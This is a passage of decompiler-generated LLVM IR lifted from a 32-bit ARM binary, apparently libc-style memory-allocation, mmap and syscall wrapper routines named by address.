  %v1_14388 = add i32 %v0_1437c, -4
  %v2_14388 = inttoptr i32 %v1_14388 to i32*
  %v3_14388 = load i32, i32* %v2_14388, align 4
  %v1_1438c = urem i32 %v3_14388, 2
  %v2_1438c = icmp eq i32 %v1_1438c, 0
  br i1 %v2_1438c, label %dec_label_pc_143c0, label %dec_label_pc_14394

dec_label_pc_14394:                               ; preds = %dec_label_pc_14388
  %v0_14394 = load i32, i32* @r4, align 4
  %v1_14394 = add i32 %v0_14394, 3
  %v3_14398 = udiv i32 %v1_14394, 4
  store i32 %v3_14398, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v1_14394, 4
  br i1 %tmp, label %dec_label_pc_143c0, label %dec_label_pc_143a0

dec_label_pc_143a0:                               ; preds = %dec_label_pc_14394
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_143a4

dec_label_pc_143a4:                               ; preds = %.thread, %dec_label_pc_143a0
  %v0_143b42 = phi i32 [ %v1_143b4, %.thread ], [ %v3_14398, %dec_label_pc_143a0 ]
  %v2_143b0 = phi i32 [ %v1_143b8, %.thread ], [ 0, %dec_label_pc_143a0 ]
  %v2_143a4 = add i32 %v2_143b0, %v0_1437c
  %v3_143a4 = inttoptr i32 %v2_143a4 to i32*
  %v4_143a4 = load i32, i32* %v3_143a4, align 4
  %v2_143a8 = icmp eq i32 %v4_143a4, 0
  br i1 %v2_143a8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_143a4
  store i32 0, i32* %v3_143a4, align 4
  %v0_143b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_143b8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_143a4, %bb
  %v0_143b8 = phi i32 [ %v2_143b0, %dec_label_pc_143a4 ], [ %v0_143b8.pre, %bb ]
  %v0_143b4 = phi i32 [ %v0_143b42, %dec_label_pc_143a4 ], [ %v0_143b4.pre, %bb ]
  %v1_143b4 = add i32 %v0_143b4, -1
  store i32 %v1_143b4, i32* %r2.global-to-local, align 4
  %v7_143b4 = icmp eq i32 %v0_143b4, 1
  %v1_143b8 = add i32 %v0_143b8, 4
  store i32 %v1_143b8, i32* %r1.global-to-local, align 4
  br i1 %v7_143b4, label %dec_label_pc_143c0.loopexit, label %dec_label_pc_143a4

dec_label_pc_143c0.loopexit:                      ; preds = %.thread
  br label %dec_label_pc_143c0

dec_label_pc_143c0:                               ; preds = %dec_label_pc_143c0.loopexit, %dec_label_pc_14394, %dec_label_pc_14388, %dec_label_pc_14374
  ret i32 %v0_1437c

; uselistorder directives
  uselistorder i32 %v1_143b8, { 1, 0 }
  uselistorder i32 %v1_143b4, { 1, 0 }
  uselistorder i32 %v2_143b0, { 1, 0 }
  uselistorder i32 %v3_14398, { 1, 0 }
  uselistorder i32 %v0_1437c, { 2, 0, 1, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_143c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_143c8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_143c8 = load i32, i32* @r4, align 4
  store i32 %v3_143c8, i32* %stack_var_-32, align 4
  %v6_143c8 = load i32, i32* @r5, align 4
  %v9_143c8 = load i32, i32* @r6, align 4
  %v12_143c8 = load i32, i32* @r7, align 4
  %v15_143c8 = load i32, i32* @r8, align 4
  %v18_143c8 = load i32, i32* @sb, align 4
  %v21_143c8 = load i32, i32* @sl, align 4
  %v24_143c8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_143cc = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @r0, align 4
  br i1 %v2_143cc, label %dec_label_pc_14564, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %dec_label_pc_143c8
  store i32 2147479535, i32* %r3.global-to-local, align 4
  %v1_143e0 = add i32 %arg2, -1
  %tmp = icmp ult i32 %v1_143e0, 2147479536
  br i1 %tmp, label %.thread, label %dec_label_pc_143f4

.thread:                                          ; preds = %dec_label_pc_143d8
  %v5_143e8 = add i32 %arg2, 23
  store i32 %v5_143e8, i32* %r3.global-to-local, align 4
  %v5_143ec = and i32 %v5_143e8, -16
  br label %dec_label_pc_14400

dec_label_pc_143f4:                               ; preds = %dec_label_pc_143d8
  %v2_143f4 = icmp eq i32 %arg2, 0
  br i1 %v2_143f4, label %dec_label_pc_14400, label %dec_label_pc_14590

dec_label_pc_14400:                               ; preds = %dec_label_pc_143f4, %.thread
  %v0_144f8 = phi i32 [ %v5_143ec, %.thread ], [ 16, %dec_label_pc_143f4 ]
  store i32 %v0_144f8, i32* @r5, align 4
  %v1_14400 = add i32 %arg1, -8
  store i32 %v1_14400, i32* @r4, align 4
  %v1_14404 = add i32 %arg1, -4
  %v2_14404 = inttoptr i32 %v1_14404 to i32*
  %v3_14404 = load i32, i32* %v2_14404, align 4
  %v1_14408 = urem i32 %v3_14404, 2
  store i32 %v1_14408, i32* %r3.global-to-local, align 4
  %v2_14408 = icmp eq i32 %v1_14408, 0
  %v1_1440c = and i32 %v3_14404, -2
  store i32 %v1_1440c, i32* @r6, align 4
  br i1 %v2_14408, label %dec_label_pc_14414, label %dec_label_pc_14484

dec_label_pc_14414:                               ; preds = %dec_label_pc_14400
  %v2_14414 = inttoptr i32 %v1_14400 to i32*
  %v3_14414 = load i32, i32* %v2_14414, align 4
  store i32 %v3_14414, i32* @r7, align 4
  %v1_14418 = urem i32 %v3_14414, 2
  %v2_14418 = icmp eq i32 %v1_14418, 0
  %v2_1441c = add i32 %v3_14414, %v0_144f8
  store i32 %v2_1441c, i32* @r8, align 4
  br i1 %v2_14418, label %bb34, label %bb33

bb33:                                             ; preds = %dec_label_pc_14414
  call void @llvm.trap()
  unreachable

bb34:                                             ; preds = %dec_label_pc_14414
  %v3_14428 = icmp ult i32 %v2_1441c, 4094
  br i1 %v3_14428, label %dec_label_pc_144f8, label %dec_label_pc_1442c

dec_label_pc_1442c:                               ; preds = %dec_label_pc_144f8.dec_label_pc_1442c_crit_edge, %bb34
  %v1_14438 = phi i32 [ %v1_14438.pre, %dec_label_pc_144f8.dec_label_pc_1442c_crit_edge ], [ %v3_14414, %bb34 ]
  %v0_14438 = phi i32 [ %v0_14438.pre, %dec_label_pc_144f8.dec_label_pc_1442c_crit_edge ], [ %v1_1440c, %bb34 ]
  %v0_1442c = phi i32 [ %v0_1442c.pre, %dec_label_pc_144f8.dec_label_pc_1442c_crit_edge ], [ %v2_1441c, %bb34 ]
  %v1_14430 = add i32 %v0_1442c, 4095
  store i32 %v1_14430, i32* %r3.global-to-local, align 4
  %v2_14438 = add i32 %v1_14438, %v0_14438
  store i32 %v2_14438, i32* %r6.global-to-local, align 4
  %v1_1443c = and i32 %v1_14430, -4096
  store i32 %v1_1443c, i32* %r5.global-to-local, align 4
  %v9_14440 = icmp eq i32 %v2_14438, %v1_1443c
  br i1 %v9_14440, label %bb37, label %dec_label_pc_14448

dec_label_pc_14448:                               ; preds = %dec_label_pc_1442c
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v1_1443c, i32* @r2, align 4
  %v1_14450 = load i32, i32* @r4, align 4
  %v2_14450 = sub i32 %v1_14450, %v1_14438
  store i32 %v2_14450, i32* @r0, align 4
  store i32 %v2_14438, i32* %r1.global-to-local, align 4
  %v4_14458 = call i32 @function_146b8(i32 %v2_14450, i32 %v2_14438, i32 %v1_1443c, i32 1)
  store i32 %v4_14458, i32* %r0.global-to-local, align 4
  %v3_1445c = icmp eq i32 %v4_14458, -1
  %v8_1445c = icmp eq i32 %v4_14458, -1
  br i1 %v8_1445c, label %.thread3, label %bb35

bb35:                                             ; preds = %dec_label_pc_14448
  %v1_14460 = load i32, i32* @r7, align 4
  %v3_14460 = add i32 %v1_14460, %v4_14458
  store i32 %v3_14460, i32* %r3.global-to-local, align 4
  %v2_14464 = load i32, i32* %r5.global-to-local, align 4
  %v3_14464 = sub i32 %v2_14464, %v1_14460
  %v2_14468 = add i32 %v3_14460, 8
  store i32 %v2_14468, i32* @sb, align 4
  %v3_1446c = add i32 %v3_14460, 4
  %v4_1446c = inttoptr i32 %v3_1446c to i32*
  store i32 %v3_14464, i32* %v4_1446c, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14448, %bb35
  br i1 %v3_1445c, label %dec_label_pc_14474, label %dec_label_pc_144c0

dec_label_pc_14474:                               ; preds = %.thread3
  %v0_14474 = load i32, i32* %r6.global-to-local, align 4
  %v1_14474 = load i32, i32* %r5.global-to-local, align 4
  %tmp41 = icmp ugt i32 %v0_14474, %v1_14474
  br i1 %tmp41, label %bb37, label %bb36

bb36:                                             ; preds = %dec_label_pc_14474
  store i32 0, i32* @sl, align 4
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_14474, %dec_label_pc_1442c, %bb36
  %v0_1447c = load i32, i32* @sl, align 4
  store i32 %v0_1447c, i32* @sb, align 4
  br label %dec_label_pc_144c0

dec_label_pc_14484:                               ; preds = %dec_label_pc_14400
  %v2_14484 = add i32 %v1_1440c, %v1_14400
  %v3_14484 = inttoptr i32 %v2_14484 to i32*
  %v4_14484 = load i32, i32* %v3_14484, align 4
  store i32 %v4_14484, i32* %r3.global-to-local, align 4
  %v9_14488 = icmp eq i32 %v3_14404, %v4_14484
  br i1 %v9_14488, label %.thread4, label %bb38

bb38:                                             ; preds = %dec_label_pc_14484
  store i32 0, i32* %r3.global-to-local, align 4
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_14484
  %v3_14494 = icmp ult i32 %v1_1440c, %v0_144f8
  br i1 %v3_14494, label %dec_label_pc_14520, label %.thread9

.thread9:                                         ; preds = %.thread4
  %v2_14498 = or i32 %v3_14404, 1
  store i32 %v2_14498, i32* %r3.global-to-local, align 4
  store i32 %v2_14484, i32* @r7, align 4
  store i32 %v2_14498, i32* %v3_14484, align 4
  %v1_144a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_144a4 = load i32, i32* @r4, align 4
  %v3_144a4 = add i32 %v2_144a4, 4
  %v4_144a4 = inttoptr i32 %v3_144a4 to i32*
  store i32 %v1_144a4, i32* %v4_144a4, align 4
  br label %dec_label_pc_144ac

dec_label_pc_144ac:                               ; preds = %dec_label_pc_1456c, %.thread9
  %v0_144ac = load i32, i32* %r3.global-to-local, align 4
  %v1_144ac = and i32 %v0_144ac, -2
  store i32 %v1_144ac, i32* %r1.global-to-local, align 4
  %v1_144b0 = add i32 %v1_144ac, -16
  %v1_144b4 = load i32, i32* @r5, align 4
  %tmp42 = icmp ugt i32 %v1_144b0, %v1_144b4
  br i1 %tmp42, label %dec_label_pc_144cc, label %dec_label_pc_144bc

dec_label_pc_144bc:                               ; preds = %dec_label_pc_144ac, %dec_label_pc_144cc
  %v0_144bc = load i32, i32* @r4, align 4
  %v1_144bc = add i32 %v0_144bc, 8
  store i32 %v1_144bc, i32* @sb, align 4
  br label %dec_label_pc_144c0

dec_label_pc_144c0:                               ; preds = %.thread3, %dec_label_pc_1453c, %dec_label_pc_14590, %dec_label_pc_1454c, %dec_label_pc_14508, %bb37, %dec_label_pc_144bc
  %v0_144c0 = load i32, i32* @sb, align 4
  store i32 %v0_144c0, i32* %r0.global-to-local, align 4
  %v2_144c4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_144c4, i32* @r4, align 4
  store i32 %v6_143c8, i32* @r5, align 4
  store i32 %v9_143c8, i32* @r6, align 4
  store i32 %v12_143c8, i32* @r7, align 4
  store i32 %v15_143c8, i32* @r8, align 4
  store i32 %v18_143c8, i32* @sb, align 4
  store i32 %v21_143c8, i32* @sl, align 4
  store i32 %v24_143c8, i32* @lr, align 4
  ret i32 %v0_144c0

dec_label_pc_144cc:                               ; preds = %dec_label_pc_144ac
  %v2_144cc = sub i32 %v1_144ac, %v1_144b4
  %v1_144d0 = or i32 %v2_144cc, 1
  store i32 %v1_144d0, i32* %r3.global-to-local, align 4
  %v0_144d4 = load i32, i32* @r4, align 4
  %v2_144d4 = add i32 %v0_144d4, %v1_144b4
  store i32 %v2_144d4, i32* %r0.global-to-local, align 4
  %v1_144d8 = or i32 %v1_144b4, 1
  store i32 %v1_144d8, i32* @r2, align 4
  %v2_144dc = add i32 %v2_144d4, 4
  %v3_144dc = inttoptr i32 %v2_144dc to i32*
  store i32 %v1_144d0, i32* %v3_144dc, align 4
  %v0_144e0 = load i32, i32* @r2, align 4
  %v1_144e0 = load i32, i32* @r4, align 4
  %v2_144e0 = load i32, i32* @r5, align 4
  %v3_144e0 = add i32 %v2_144e0, %v1_144e0
  %v4_144e0 = inttoptr i32 %v3_144e0 to i32*
  store i32 %v0_144e0, i32* %v4_144e0, align 4
  %v0_144e4 = load i32, i32* @r2, align 4
  %v1_144e4 = load i32, i32* @r4, align 4
  %v2_144e4 = add i32 %v1_144e4, 4
  %v3_144e4 = inttoptr i32 %v2_144e4 to i32*
  store i32 %v0_144e4, i32* %v3_144e4, align 4
  %v0_144e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_144e8 = load i32, i32* @r4, align 4
  %v2_144e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_144e8 = add i32 %v2_144e8, %v1_144e8
  %v4_144e8 = inttoptr i32 %v3_144e8 to i32*
  store i32 %v0_144e8, i32* %v4_144e8, align 4
  %v0_144ec = load i32, i32* %r0.global-to-local, align 4
  %v1_144ec = add i32 %v0_144ec, 8
  store i32 %v1_144ec, i32* %r0.global-to-local, align 4
  %v1_144f0 = call i32 @function_13780(i32 %v1_144ec)
  store i32 %v1_144f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_144bc

dec_label_pc_144f8:                               ; preds = %bb34
  store i32 %v0_144f8, i32* @r0, align 4
  %v0_144fc = call i32 @function_13c7c()
  store i32 %v0_144fc, i32* %r0.global-to-local, align 4
  store i32 %v0_144fc, i32* @sb, align 4
  %v2_14500 = icmp eq i32 %v0_144fc, 0
  br i1 %v2_14500, label %dec_label_pc_144f8.dec_label_pc_1442c_crit_edge, label %dec_label_pc_14508

dec_label_pc_144f8.dec_label_pc_1442c_crit_edge:  ; preds = %dec_label_pc_144f8
  %v0_1442c.pre = load i32, i32* @r8, align 4
  %v0_14438.pre = load i32, i32* @r6, align 4
  %v1_14438.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1442c

dec_label_pc_14508:                               ; preds = %dec_label_pc_144f8
  %v0_14508 = load i32, i32* @r5, align 4
  %v1_14508 = add i32 %v0_14508, -8
  %v0_1450c = load i32, i32* @sl, align 4
  store i32 %v0_1450c, i32* %r1.global-to-local, align 4
  %v3_14510 = inttoptr i32 %v0_144fc to i16*
  %v4_14510 = call i32 @function_150f0(i16* %v3_14510, i32 %v0_1450c, i32 %v1_14508)
  %v0_14514 = load i32, i32* @sl, align 4
  store i32 %v0_14514, i32* %r0.global-to-local, align 4
  %v1_14518 = call i32 @function_13780(i32 %v0_14514)
  store i32 %v1_14518, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_144c0

dec_label_pc_14520:                               ; preds = %.thread4
  store i32 %v2_14484, i32* @r7, align 4
  store i32 %v2_14484, i32* %r0.global-to-local, align 4
  %v1_14524 = call i32 @function_134f0(i32 %v2_14484)
  store i32 %v1_14524, i32* %r0.global-to-local, align 4
  %v2_14528 = icmp eq i32 %v1_14524, 0
  br i1 %v2_14528, label %.thread12, label %dec_label_pc_1456c

.thread12:                                        ; preds = %dec_label_pc_14520
  %v1_1452c = load i32, i32* @r6, align 4
  %v2_1452c = or i32 %v1_1452c, 1
  store i32 %v2_1452c, i32* %r3.global-to-local, align 4
  %v2_14530 = load i32, i32* @r4, align 4
  %v4_14530 = add i32 %v2_14530, %v1_1452c
  %v5_14530 = inttoptr i32 %v4_14530 to i32*
  store i32 %v2_1452c, i32* %v5_14530, align 4
  %v1_14534 = load i32, i32* %r3.global-to-local, align 4
  %v2_14534 = load i32, i32* @r4, align 4
  %v3_14534 = add i32 %v2_14534, 4
  %v4_14534 = inttoptr i32 %v3_14534 to i32*
  store i32 %v1_14534, i32* %v4_14534, align 4
  br label %dec_label_pc_1453c

dec_label_pc_1453c:                               ; preds = %dec_label_pc_1456c, %.thread12
  %v0_1453c = load i32, i32* @r5, align 4
  %v1_1453c = add i32 %v0_1453c, -8
  store i32 %v1_1453c, i32* @r0, align 4
  %v0_14540 = call i32 @function_13c7c()
  store i32 %v0_14540, i32* %r0.global-to-local, align 4
  store i32 %v0_14540, i32* @sb, align 4
  %v2_14544 = icmp eq i32 %v0_14540, 0
  br i1 %v2_14544, label %dec_label_pc_144c0, label %dec_label_pc_1454c

dec_label_pc_1454c:                               ; preds = %dec_label_pc_1453c
  %v0_1454c = load i32, i32* @sl, align 4
  store i32 %v0_1454c, i32* %r1.global-to-local, align 4
  %v0_14550 = load i32, i32* @r6, align 4
  %v1_14550 = add i32 %v0_14550, -8
  %v3_14554 = inttoptr i32 %v0_14540 to i16*
  %v4_14554 = call i32 @function_150f0(i16* %v3_14554, i32 %v0_1454c, i32 %v1_14550)
  %v0_14558 = load i32, i32* @r4, align 4
  %v1_14558 = add i32 %v0_14558, 8
  store i32 %v1_14558, i32* %r0.global-to-local, align 4
  %v1_1455c = call i32 @function_13780(i32 %v1_14558)
  store i32 %v1_1455c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_144c0

dec_label_pc_14564:                               ; preds = %dec_label_pc_143c8
  store i32 %v21_143c8, i32* @sl, align 4
  %v0_14568 = call i32 @function_13c7c()
  store i32 %v0_14568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1456c

dec_label_pc_1456c:                               ; preds = %dec_label_pc_14520, %dec_label_pc_14564
  %v0_1456c = load i32, i32* @r7, align 4
  %v1_1456c = add i32 %v0_1456c, 4
  %v2_1456c = inttoptr i32 %v1_1456c to i32*
  %v3_1456c = load i32, i32* %v2_1456c, align 4
  %v1_14570 = and i32 %v3_1456c, -2
  %v1_14574 = load i32, i32* @r6, align 4
  %v2_14574 = add i32 %v1_14574, %v1_14570
  %v1_14578 = load i32, i32* @r5, align 4
  %v3_14578 = icmp ult i32 %v2_14574, %v1_14578
  %v1_1457c = or i32 %v2_14574, 1
  store i32 %v1_1457c, i32* %r3.global-to-local, align 4
  %v3_14580 = add i32 %v1_14570, %v0_1456c
  %v4_14580 = inttoptr i32 %v3_14580 to i32*
  store i32 %v1_1457c, i32* %v4_14580, align 4
  %v0_14584 = load i32, i32* %r3.global-to-local, align 4
  %v1_14584 = load i32, i32* @r4, align 4
  %v2_14584 = add i32 %v1_14584, 4
  %v3_14584 = inttoptr i32 %v2_14584 to i32*
  store i32 %v0_14584, i32* %v3_14584, align 4
  br i1 %v3_14578, label %dec_label_pc_1453c, label %dec_label_pc_144ac

dec_label_pc_14590:                               ; preds = %dec_label_pc_143f4
  %v0_14590 = call i32 @function_12ecc()
  store i32 %v0_14590, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1459c = inttoptr i32 %v0_14590 to i32*
  store i32 12, i32* %v2_1459c, align 4
  br label %dec_label_pc_144c0

; uselistorder directives
  uselistorder i32 %v1_144b4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_14484, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_14460, { 1, 0 }
  uselistorder i32 %v4_14458, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14438, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1441c, { 1, 0, 2 }
  uselistorder i32 %v3_14414, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1440c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_14408, { 1, 0 }
  uselistorder i32 %v3_14404, { 1, 2, 3, 0 }
  uselistorder i32 %v0_144f8, { 0, 2, 1, 3 }
  uselistorder i32 %v21_143c8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 14, 13, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 16, 4, 3, 5, 7, 6, 8, 9, 10, 15, 11, 12, 13, 14, 1, 0 }
  uselistorder i32 (i32)* @function_134f0, { 1, 0 }
  uselistorder i32 ()* @function_13c7c, { 57, 5, 4, 0, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1, 3, 6 }
  uselistorder i32 (i32)* @function_13780, { 4, 3, 2, 0, 5, 7, 6, 1 }
  uselistorder i32 4095, { 0, 2, 1, 3, 4 }
  uselistorder i32 %arg2, { 3, 1, 0, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1456c, { 1, 0 }
  uselistorder label %dec_label_pc_144c0, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder label %dec_label_pc_144bc, { 1, 0 }
  uselistorder label %bb37, { 2, 0, 1 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_145a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_145a4:
  store i32 %arg2, i32* @r2, align 4
  %v0_145c8 = call i32 @function_13178()
  ret i32 %v0_145c8
}

define i32 @function_145dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_145dc:
  %v0_145e8 = call i32 @function_13178()
  ret i32 %v0_145e8
}

define i32 @function_145f4() local_unnamed_addr {
dec_label_pc_145f4:
  %v1_145f4 = load i32, i32* @r0, align 4
  ret i32 %v1_145f4
}

define i32 @function_145f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_145f8:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v2_14610 = urem i32 %arg6, 4096
  %v2_14614 = and i32 %arg7, -4096
  %v2_14618 = or i32 %v2_14614, %v2_14610
  %v4_14618 = icmp eq i32 %v2_14618, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg3, i32* %fp.global-to-local, align 4
  %v0_14628 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14628, i32* %sl.global-to-local, align 4
  br i1 %v4_14618, label %dec_label_pc_14640, label %dec_label_pc_14630

dec_label_pc_14630:                               ; preds = %dec_label_pc_145f8
  %v0_14630 = call i32 @function_12ecc()
  br label %dec_label_pc_14654

dec_label_pc_14640:                               ; preds = %dec_label_pc_145f8
  %tmp = icmp ult i32 %arg2, 2147483647
  br i1 %tmp, label %dec_label_pc_1465c, label %dec_label_pc_14648

dec_label_pc_14648:                               ; preds = %dec_label_pc_14640
  %v0_14648 = call i32 @function_12ecc()
  br label %dec_label_pc_14654

dec_label_pc_14654:                               ; preds = %dec_label_pc_14630, %dec_label_pc_14648
  %storemerge1 = phi i32 [ %v0_14630, %dec_label_pc_14630 ], [ %v0_14648, %dec_label_pc_14648 ]
  %storemerge = phi i32 [ 22, %dec_label_pc_14630 ], [ 12, %dec_label_pc_14648 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %storemerge, i32* @r3, align 4
  %v2_14654 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_14654, align 4
  %v0_1469c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1469c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_14640
  %v1_1465c = and i32 %v0_14628, 16
  %v2_1465c = icmp eq i32 %v1_1465c, 0
  br i1 %v2_1465c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1465c
  store i32 83444, i32* %r3.global-to-local, align 4
  store i32 83564, i32* @lr, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1465c, %bb
  %v2_14668 = xor i1 %v2_1465c, true
  call void @__pseudo_cond_branch(i1 %v2_14668, i32 ptrtoint (i32* @global_var_145f4.586 to i32))
  %v0_1467c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1467c, i32* @r0, align 4
  %v0_14680 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14680, i32* @r2, align 4
  %v0_14684 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_14684, i32* @r3, align 4
  %v3_14688 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14688, i32* @r4, align 4
  %v0_14694 = call i32 @function_13178()
  store i32 %v0_14694, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1469c

dec_label_pc_1469c:                               ; preds = %dec_label_pc_14654, %.thread
  %v0_1469c = phi i32 [ %v0_1469c.pre, %dec_label_pc_14654 ], [ %v0_14694, %.thread ]
  ret i32 %v0_1469c

; uselistorder directives
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32 -4096, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_1469c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14654, { 1, 0 }
}

define i32 @function_146b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_146b8:
  store i32 %arg2, i32* @r4, align 4
  %v0_146dc = call i32 @function_13178()
  ret i32 %v0_146dc
}

define i32 @function_146f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_146f4:
  store i32 %arg1, i32* @r0, align 4
  store i32 83444, i32* @r3, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 83728, i32* @lr, align 4
  %v1_1470c = call i32 @function_145f4()
  %v0_14710 = load i32, i32* @r4, align 4
  store i32 %v0_14710, i32* @r0, align 4
  %v0_1471c = call i32 @function_13178()
  ret i32 %v0_1471c
}

define i32 @function_1472c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1472c:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_14758 = call i32 @function_15754(i32 285, i32 %arg1, i32 %arg2)
  store i32 %v3_14758, i32* @r0, align 4
  %v0_1475c = call i32 @function_13178()
  ret i32 %v0_1475c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_14770(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14770:
  store i32 %arg1, i32* @r0, align 4
  %v3_14774 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_14788 = call i32 @function_13178()
  store i32 %v3_14774, i32* @r4, align 4
  ret i32 %v0_14788
}

define i32 @function_14798(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14798:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_147c4 = call i32 @function_15754(i32 283, i32 %arg1, i32 %arg2)
  store i32 %v3_147c4, i32* @r0, align 4
  %v0_147c8 = call i32 @function_13178()
  ret i32 %v0_147c8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_147dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_147dc:
  store i32 %arg1, i32* @r0, align 4
  %v3_147e0 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v0_147f4 = call i32 @function_13178()
  store i32 %v3_147e0, i32* @r4, align 4
  ret i32 %v0_147f4
}

define i32 @function_14804(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_14804:
  store i32 %arg1, i32* @r0, align 4
  %v3_14804 = load i32, i32* @r4, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_14818 = call i32 @function_13178()
  store i32 %v3_14804, i32* @r4, align 4
  ret i32 %v0_14818
}

define i32 @function_14828(i32 %arg1) local_unnamed_addr {
dec_label_pc_14828:
  %v2_14844 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_14844
}

define i32 @function_1484c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1484c:
  %v3_1484c = udiv i32 %arg1, 256
  %v4_14850 = mul i32 %arg1, 256
  %v5_14850 = or i32 %v4_14850, %v3_1484c
  %v3_14854 = mul i32 %v5_14850, 65536
  store i32 %v3_14854, i32* @r3, align 4
  %v3_14858 = urem i32 %v5_14850, 65536
  ret i32 %v3_14858

; uselistorder directives
  uselistorder i32 %v5_14850, { 1, 0 }
}

define i32 @function_14860(i32 %arg1) local_unnamed_addr {
